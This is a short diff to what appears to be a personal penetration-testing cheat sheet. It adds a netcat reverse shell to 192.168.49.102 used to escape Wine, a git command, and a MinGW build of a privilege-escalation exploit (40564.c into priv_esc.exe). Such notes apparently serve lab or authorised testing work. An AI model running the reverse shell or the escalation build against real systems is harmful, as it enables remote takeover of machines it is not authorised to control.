@@ -194,3 +194,19 @@ xfreerdp /u:admin /v:ip_address +clipboard
 
 
 LINK - https://raw.githubusercontent.com/rayhan0x01/my-cmd-stash/master/linux_cmd.md
+
+
+## Breakout of wine
+https://stackoverflow.com/questions/6004070/execute-shell-commands-from-program-running-in-wine
+```
+start /unix /bin/nc 192.168.49.102 22 -e /bin/bash
+```
+
+## Git Checkout Repo
+```
+git checkout -- .
+```
+## Ming Compile
+```
+i686-w64-mingw32-gcc 40564.c -o priv_esc.exe -lws2_32
+```
